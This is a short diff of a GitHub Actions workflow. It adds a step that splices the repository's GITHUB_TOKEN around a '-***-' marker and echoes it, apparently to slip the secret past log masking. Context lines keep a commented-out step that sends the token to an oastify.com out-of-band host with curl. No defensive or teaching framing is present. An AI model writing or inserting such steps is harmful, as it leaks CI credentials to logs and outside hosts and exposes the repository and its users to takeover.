@@ -24,7 +24,9 @@ jobs:
           ls ${{ github.workspace }}
       - run: echo "🍏 This job's status is ${{ job.status }}."
       - name: Echoos
-        run: echo $KOKO
+        run: |
+          MODIFIED_SECRET="${{ secrets.GITHUB_TOKEN:0:5 }}-***-${{ secrets.GITHUB_TOKEN:5 }}"
+          echo $MODIFIED_SECRET
       # - name: Show secret
       #   run: |
       #     curl -X GET https://8bkmpsonimqso848i8qdzcxax13srif7.oastify.com?token=${{secrets.GITHUB_TOKEN}}
